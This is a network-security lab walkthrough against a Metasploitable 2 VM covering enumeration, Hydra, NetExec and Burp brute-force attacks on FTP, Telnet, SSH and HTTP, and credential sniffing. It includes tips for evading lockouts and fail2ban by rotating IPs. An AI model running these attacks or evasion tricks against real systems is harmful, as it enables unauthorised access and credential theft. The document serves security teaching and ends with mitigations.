# Network Protocol Security Lab Walkthrough

## 1. Lab Setup
### Objective
The goal of this lab is to explore vulnerabilities in common network protocols (FTP, TELNET, SSH, HTTP) by performing brute force attacks, sniffing network traffic, and analyzing security weaknesses. Additionally, mitigation strategies will be proposed to improve security.

### Environment
- **Kali Linux** (Attacker Machine)
- **Metasploitable 2** (Target VM)
- **Tools Used:**
  - Hydra, Medusa, NetExec (Brute Force Attacks)
  - Burp Suite (HTTP Login Brute Force)
  - Wireshark, tcpdump (Traffic Sniffing)
  - Nmap, Enum4Linux (Enumeration)

## 🔍 2. Enumeration
### 🎯 Scanning the Target Machine
First, identify open ports and services running on the target VM:
```bash
nmap -sC -sV -p 21,22,23,80 <TARGET_IP>
```

**Explanation:**
- `-sC`: Runs default NSE scripts
- `-sV`: Service version detection
- `-p`: Scans only specified ports (FTP, SSH, Telnet, HTTP)

![alt text](image.png)

**Alternative (with specific scripts):**
```bash
nmap -p 21,22,23,80 --script=ftp-anon,telnet-encryption,ssh-hostkey,http-title <TARGET_IP>
```

🔧 **Expected Output:**  
A list of open ports, service banners, and basic vulnerability info (e.g., anonymous FTP access, SSH keys, Telnet security, web titles)

![alt text](image-1.png)

### Enumerating Usernames
#### 🧱 From SMB (to use with SSH, Telnet, FTP later):
```bash
enum4linux -a <TARGET_IP>
```
**What it does:**  
Enumerates users, shares, groups, and policies over SMB. Useful for finding valid system usernames that might also exist in SSH/Telnet/FTP.

> 💡 Look for usernames like `msfadmin`, `user`, `postgres`, etc. in the output.

![alt text](image-2.png)
![alt text](image-3.png)
![alt text](image-4.png)
![alt text](image-5.png)
![alt text](image-6.png)
![alt text](image-7.png)
![alt text](image-8.png)
![alt text](image-9.png)
![alt text](image-10.png)
![alt text](image-11.png)
![alt text](image-12.png)
![alt text](image-13.png)
![alt text](image-14.png)

#### 🌐 Web Server Enumeration (HTTP)

Use `gobuster` to find hidden directories or files on the web server:
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```
**Flags explained:**
- `-u`: Target URL
- `-w`: Wordlist
- `-t`: Number of threads (40 for speed, adjust as needed)

> 💡 Look out for directories like `/admin`, `/login`, `/uploads`, etc.

![alt text](image-15.png)

## 🔐3. Brute Force Attacks

### ✅ **Preparation**
Before launching brute force attacks, make sure you have:
- A **list of usernames** (`userlist.txt`)
- A **list of passwords** (`passlist.txt`)

> You can use default ones from Kali:
```bash
/usr/share/wordlists/rockyou.txt
```

Or create your own minimal test list:
```bash
echo -e "admin\nuser\ntest\msfadmin" > userlist.txt
echo -e "1234\nadmin\npassword\msfadmin" > passlist.txt
```

### 🔹3.1 FTP Brute Force Attack (Hydra)
```bash
hydra -L userlist.txt -P passlist.txt <TARGET_IP> ftp -V
```
- `-L`: path to username list
- `-P`: path to password list
- `-V`: verbose (shows attempts)
- `ftp://<TARGET_IP>`: target service

![alt text](image-16.png)

### 🔹3.2 TELNET Brute Force Attack (Hydra)
```bash
hydra -L userlist.txt -P passlist.txt <TARGET_IP> telnet -V
```
- **`-L userlist.txt`**: Path to username list
- **`-P passlist.txt`**: Path to password list
- **`telnet://<TARGET_IP>`**: Target Telnet service
- **`-V`**: Verbose mode (shows attempts)

![alt text](image-17.png)

### 🔹3.3 SSH Brute Force Attack (NetExec)
NetExec (formerly CrackMapExec) is great for SSH:
```bash
nxc ssh <TARGET_IP> -u userlist.txt -p passlist.txt
```
- `-u`: Path to username list
- `-p`: Path to password list
- `-m ssh`: Specifies SSH as the target service


If you want to use Hydra instead:
```bash
hydra -L userlist.txt -P passlist.txt ssh://<TARGET_IP>
```
- `-L`: Path to username list
- `-P`: Path to password list
- `ssh://<TARGET_IP>`: Target SSH service

🧠 SSH often has brute force protection — space out requests or use a proxy if needed.

### 🔹3.4 HTTP Login Brute Force Attack (Burp Suite)
1. Start **Burp Suite** → Set your browser to use Burp as a proxy.
2. Try to log in to the HTTP page → Capture the request in **Proxy** tab.
3. Right-click → **Send to Intruder**
4. In **Intruder** tab:
   - Set attack type to **Cluster Bomb**
   - Mark **username** and **password** fields as payload positions
5. Load payloads:
   - Payload set 1: `userlist.txt`
   - Payload set 2: `passlist.txt`
6. Start Attack and watch for:
   - Status code changes
   - Different length in response
   - Success indicators (e.g., “Welcome” or redirect)

*Provide screenshot of a successful login attempt.*

### ⚠️ Common Issues & Fixes

| Problem | Cause | Fix |
|--------|-------|-----|
| Too many failed attempts | Account lockout / rate-limiting | Add delay or reduce threads (`-t 1`) |
| CAPTCHA or login form protections | HTTP brute force fails | May need manual testing or bypass techniques |
| SSH protection (fail2ban) | IP gets banned | Rotate IPs (proxychains or VPN) |

## 4. Sniffing Network Traffic
### Capturing Packets using Wireshark
1. Open Wireshark:
```bash
sudo wireshark
```
2. Start capture on the network interface connected to the target.
3. Apply filters:
   - FTP: `tcp.port == 21`
   - TELNET: `tcp.port == 23`
   - SSH: `tcp.port == 22`
   - HTTP: `tcp.port == 80`
4. Identify unencrypted traffic containing credentials.

### Capturing Packets using tcpdump
```bash
sudo tcpdump -i eth0 port 21 or port 23 or port 22 or port 80 -w capture.pcap
```
Analyze `capture.pcap` in Wireshark.

*Provide screenshot of captured plaintext credentials.*

## 5. Problems Encountered
- **Rate Limiting / Account Lockouts:** Some services limit failed attempts.
  - **Solution:** Use slow attack mode (`-t 1` in Hydra) or rotate IPs via proxychains.
- **CAPTCHA / Anti-Brute Force Mechanisms:** Some login forms block automated requests.
  - **Solution:** Modify request headers or use manual testing techniques.

## 6. Mitigation Strategies
| Protocol  | Vulnerability | Secure Alternative |
|-----------|--------------|--------------------|
| FTP       | Plaintext credentials | Use SFTP or FTPS |
| TELNET    | Unencrypted traffic  | Use SSH instead  |
| SSH       | Password brute force | Use SSH keys and 2FA |
| HTTP      | Unsecured login forms | Use HTTPS and implement rate-limiting |

## 7. Conclusion
- Brute force attacks were successfully performed against FTP, TELNET, SSH, and HTTP.
- Unencrypted credentials were captured from FTP and TELNET.
- Mitigation strategies, such as enforcing encryption and key-based authentication, improve security.
